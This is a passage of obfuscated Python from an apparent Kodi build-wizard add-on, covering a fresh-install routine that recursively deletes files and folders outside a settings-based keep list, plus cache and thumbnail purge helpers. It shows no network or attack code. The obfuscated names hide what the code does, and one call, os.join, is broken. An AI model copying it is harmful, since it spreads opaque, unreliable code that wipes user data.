				elif O000O000OOOOO0OO0 =='MyVideos107.db'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4938
				elif O000O000OOOOO0OO0 =='MyVideos116.db'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4939
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4940
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4941
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'skin.Premium.mod'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4942
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4943
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'skin.phenomenal'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4944
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4945
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'skin.titan'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4947
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4948
				elif O000O000OOOOO0OO0 =='sources.xml'and O0OO00OO000OOOOO0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4950
				elif O000O000OOOOO0OO0 =='quicknav.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4953
				elif O000O000OOOOO0OO0 =='x1101.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4954
				elif O000O000OOOOO0OO0 =='b-srtym-b.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4955
				elif O000O000OOOOO0OO0 =='x1102.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4956
				elif O000O000OOOOO0OO0 =='b-sdrvt-b.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4957
				elif O000O000OOOOO0OO0 =='x1112.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4958
				elif O000O000OOOOO0OO0 =='b-tlvvyzyh-b.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4959
				elif O000O000OOOOO0OO0 =='x1111.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4960
				elif O000O000OOOOO0OO0 =='b-tvknyshrly-b.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4961
				elif O000O000OOOOO0OO0 =='x1110.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4962
				elif O000O000OOOOO0OO0 =='b-yldym-b.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4963
				elif O000O000OOOOO0OO0 =='x1114.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4964
				elif O000O000OOOOO0OO0 =='b-mvzyqh-b.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4965
				elif O000O000OOOOO0OO0 =='mainmenu.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4966
				elif O000O000OOOOO0OO0 =='skin.Premium.mod.properties'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4967
				elif O000O000OOOOO0OO0 =='x1122.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4969
				elif O000O000OOOOO0OO0 =='b-spvrt-b.DATA.xml'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4970
				elif O000O000OOOOO0OO0 =='favourites.xml'and O0OO00OO000OOOOO0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4975
				elif O000O000OOOOO0OO0 =='guisettings.xml'and O0OO00OO000OOOOO0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4977
				elif O000O000OOOOO0OO0 =='profiles.xml'and O0OO00OO000OOOOO0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4978
				elif O000O000OOOOO0OO0 =='advancedsettings.xml'and O0OO00OO000OOOOO0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4979
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4980
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'program.apollo'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4981
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4982
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.telemedia'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4983
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.elementum'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4986
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4988
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'weather.yahoo'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4989
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.quasar'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4990
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'program.apollo'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4991
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4992
				elif O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -2 ]=='userdata'and O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0OO00OO000OOOOO0 [OOOOO00O0OO0O00O0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:4993
				elif O000O000OOOOO0OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%O000O000OOOOO0OO0 ,xbmc .LOGNOTICE )#line:4994
				elif O000O000OOOOO0OO0 .endswith ('.db'):#line:4995
					try :#line:4996
						if O000O000OOOOO0OO0 ==O00O000OOO000O0OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O000O000OOOOO0OO0 ,KODIV ),xbmc .LOGNOTICE )#line:4997
						else :os .remove (os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ))#line:4998
					except Exception as OOOOO000O00O00OO0 :#line:4999
						if not O000O000OOOOO0OO0 .startswith ('Textures13'):#line:5000
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5001
							wiz .log ("-> %s"%(str (OOOOO000O00O00OO0 )),xbmc .LOGNOTICE )#line:5002
							wiz .purgeDb (os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ))#line:5003
				else :#line:5004
					DP .update (int (wiz .percentage (OOO0OOO0OOO000000 ,OO000O000O0OOO000 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O000OOOOO0OO0 ),'')#line:5005
					try :os .remove (os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ))#line:5006
					except Exception as OOOOO000O00O00OO0 :#line:5007
						wiz .log ("Error removing %s"%os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),xbmc .LOGNOTICE )#line:5008
						wiz .log ("-> / %s"%(str (OOOOO000O00O00OO0 )),xbmc .LOGNOTICE )#line:5009
			if DP .iscanceled ():#line:5010
				DP .close ()#line:5011
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5012
				return False #line:5013
		for O0O0O0OO0OOO000OO ,O00O0OO0OOO000OO0 ,O0O00O000O00O0O0O in os .walk (OO0O00O0000O000O0 ,topdown =True ):#line:5014
			O00O0OO0OOO000OO0 [:]=[O0OOOO00OOO0O000O for O0OOOO00OOO0O000O in O00O0OO0OOO000OO0 if O0OOOO00OOO0O000O not in EXCLUDES ]#line:5015
			for O000O000OOOOO0OO0 in O00O0OO0OOO000OO0 :#line:5016
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O000O000OOOOO0OO0 ),'')#line:5017
			  if O000O000OOOOO0OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5018
			   if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5019
			    if not (O000O000OOOOO0OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5021
			      if not (O000O000OOOOO0OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5022
			       if not (O000O000OOOOO0OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5023
			        if not (O000O000OOOOO0OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5024
			         if not (O000O000OOOOO0OO0 =='program.apollo'and KEEPINFO =='true'):#line:5025
			          if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5026
			           if not (O000O000OOOOO0OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5027
			            if not (O000O000OOOOO0OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5028
			             if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5029
			              if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5030
			               if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5031
			                if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5032
			                 if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5033
			                  if not (O000O000OOOOO0OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5034
			                   if not (O000O000OOOOO0OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5035
			                    if not (O000O000OOOOO0OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5036
			                     if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5037
			                      if not (O000O000OOOOO0OO0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5038
			                       if not (O000O000OOOOO0OO0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5039
			                           if not (O000O000OOOOO0OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5043
			                            if not (O000O000OOOOO0OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5044
			                             if not (O000O000OOOOO0OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5045
			                              if not (O000O000OOOOO0OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5046
			                               if not (O000O000OOOOO0OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5047
			                                  shutil .rmtree (os .path .join (O0O0O0OO0OOO000OO ,O000O000OOOOO0OO0 ),ignore_errors =True ,onerror =None )#line:5049
			if DP .iscanceled ():#line:5050
				DP .close ()#line:5051
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5052
				return False #line:5053
		DP .close ()#line:5054
		wiz .clearS ('build')#line:5055
		if over ==True :#line:5056
			return True #line:5057
		elif install =='restore':#line:5058
			return True #line:5059
		elif install :#line:5060
			buildWizard (install ,'normal',over =True )#line:5061
		else :#line:5062
			if INSTALLMETHOD ==1 :OOOO0O0OO00OOO00O =1 #line:5063
			elif INSTALLMETHOD ==2 :OOOO0O0OO00OOO00O =0 #line:5064
			else :OOOO0O0OO00OOO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5065
			if OOOO0O0OO00OOO00O ==1 :wiz .reloadFix ('fresh')#line:5066
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5067
	else :#line:5068
		if not install =='restore':#line:5069
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5070
			wiz .refresh ()#line:5071
def clearCache ():#line:5076
		wiz .clearCache ()#line:5077
def fixwizard ():#line:5081
		wiz .fixwizard ()#line:5082
def totalClean ():#line:5084
		wiz .clearCache ()#line:5086
		wiz .clearPackages ('total')#line:5087
		clearThumb ('total')#line:5088
		cleanfornewbuild ()#line:5089
def cleanfornewbuild ():#line:5090
		try :#line:5091
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5092
		except :#line:5093
			pass #line:5094
		try :#line:5095
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5096
		except :#line:5097
			pass #line:5098
		try :#line:5099
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5100
		except :#line:5101
			pass #line:5102
def clearThumb (type =None ):#line:5103
	O00O0O0O00O0O0O00 =wiz .latestDB ('Textures')#line:5104
	if not type ==None :O00O0OOO0O0000O00 =1 #line:5105
	else :O00O0OOO0O0000O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O00O0O0O00O0O0O00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5106
	if O00O0OOO0O0000O00 ==1 :#line:5107
		try :wiz .removeFile (os .join (DATABASE ,O00O0O0O00O0O0O00 ))#line:5108
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O00O0O0O00O0O0O00 )#line:5109
		wiz .removeFolder (THUMBS )#line:5110
	else :wiz .log ('Clear thumbnames cancelled')#line:5112
	wiz .redoThumbs ()#line:5113
def purgeDb ():#line:5115
	OOOO000OO0OO00OOO =[];O00OOOOO0OO0O000O =[]#line:5116
	for O0000000OO0OOOO0O ,O0O00O00OOO0O0OO0 ,O0000000OO00O0OOO in os .walk (HOME ):#line:5117
		for OOO0O0000O0OOOOOO in fnmatch .filter (O0000000OO00O0OOO ,'*.db'):#line:5118
			if OOO0O0000O0OOOOOO !='Thumbs.db':#line:5119
				O0OOO0000O0OO0000 =os .path .join (O0000000OO0OOOO0O ,OOO0O0000O0OOOOOO )#line:5120
				OOOO000OO0OO00OOO .append (O0OOO0000O0OO0000 )#line:5121
				OOOOOO00O000OO0O0 =O0OOO0000O0OO0000 .replace ('\\','/').split ('/')#line:5122
				O00OOOOO0OO0O000O .append ('(%s) %s'%(OOOOOO00O000OO0O0 [len (OOOOOO00O000OO0O0 )-2 ],OOOOOO00O000OO0O0 [len (OOOOOO00O000OO0O0 )-1 ]))#line:5123
	if KODIV >=16 :#line:5124
		OOOO00OO00O0OO000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOOOO0OO0O000O )#line:5125
